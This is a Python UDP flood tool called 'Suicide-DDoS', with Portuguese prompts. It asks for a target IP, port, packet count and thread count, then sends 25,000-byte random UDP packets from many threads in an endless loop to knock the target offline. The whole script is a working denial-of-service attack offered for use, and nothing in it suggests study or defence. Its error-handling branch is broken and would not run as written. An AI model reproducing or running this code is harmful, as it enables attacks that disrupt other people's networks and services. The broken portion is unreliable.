import random
import socket
import os
import time
import threading

print("  Suicide-DDoS  \n  by: t4ucci")
print("""
░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
""")

print("Iniciando programa..")

for i in range(3+1):
    time.sleep(1)
    print(f"\n{i}..")
    
print("\n   Divirta-se!\n")

ip = str(input("[♤] Endereço: "))
port = int(input("[♤] Porta: "))
packs = int(input("[♤] Quant. Pacotes: "))
thread = int(input("[♤] Velocidade do Envio: "))

#DIGITE OS DADOS ACIMA
  
def start():
    bytes = random._urandom(25000)
    envios = 0
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            for i in range(packs):
                s.sendto(bytes, (ip, port))
                envios += 1
                print('Atacando agora: '+ip+' || Enviando: '+str(envios))
        except:
             if not packs(pergunta):
                    break
                    pergunta = str(input("Voltar?: [S/N]"))
             elif pergunta == 'S':
                    s.sendto(bytes(ip,port))
                    envios += 1
                    print('Atacando agora: '+ip+' || Enviando:'+str(envio))
             else:
                  print("[♤] O ataque está procedendo...")
                  s.close()
                  break
        s.close()
        print(">>> O ataque pode fechar em breve!")
for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
